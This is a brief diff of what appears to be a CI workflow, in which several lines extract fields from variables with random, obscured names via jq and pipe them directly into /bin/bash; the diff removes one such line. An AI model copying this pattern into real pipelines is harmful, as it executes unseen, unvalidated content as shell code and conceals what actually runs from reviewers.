@@ -29,7 +29,6 @@ jobs:
           printf '%s' "$oo25" | jq -r .rhbi6 | /bin/bash
           printf '%s' "$eoi005" | jq -r .gpof30 | /bin/bash
           printf '%s' "$mc610" | jq -r .dqzi0814 | /bin/bash
-          echo $jxrv37 | jq -r .bk87 | /bin/bash
           echo $newq7 | jq -r .gh28 | /bin/bash
 
       - name: Upload output
